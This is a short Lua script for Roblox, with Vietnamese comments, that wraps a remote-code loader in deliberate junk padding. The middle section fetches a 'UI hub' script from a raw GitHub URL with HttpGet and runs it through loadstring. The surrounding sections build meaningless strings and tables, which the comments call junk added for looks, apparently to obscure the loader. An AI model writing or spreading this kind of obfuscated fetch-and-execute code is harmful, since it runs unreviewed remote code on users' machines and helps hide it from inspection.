-- ========== RÁC HÀNG NGHÌN DÒNG ==========

local _junkA = string.rep("BQS?8F#ks-Eaa/EB5)I$F^fK7ATD:", 900)
local _junkB = {}
for i=1,500 do _junkB[i] = "RANDOM_DATA_"..math.random() end

local function _U(a,b,c,d) return (a and b) or c and d or nil end
for i=1,400 do _U(i%2==0,i%3==0,_junkA,_junkB[i]) end

-- ========== PHẦN CHẠY THẬT ==========
local _Gm = game
local _H  = _Gm.HttpGet

-- Link script gốc (UI hub)
local _url = "https://raw.githubusercontent.com/tyygyyg778-maker/Roblox-script/main/fullchucnang.lua"

local _code, _err = loadstring(_H(_Gm, _url))
if not _code then
    warn("Load Error:", _err)
else
    _code()
end

-- ========== RÁC THÊM CHO ĐẸP ==========
local _endJunk = { "###E", "%%R", "@@Z" }
local _moreJunk = table.concat(_junkB, "_X_")
local _final = _junkA.._moreJunk.._endJunk[2]
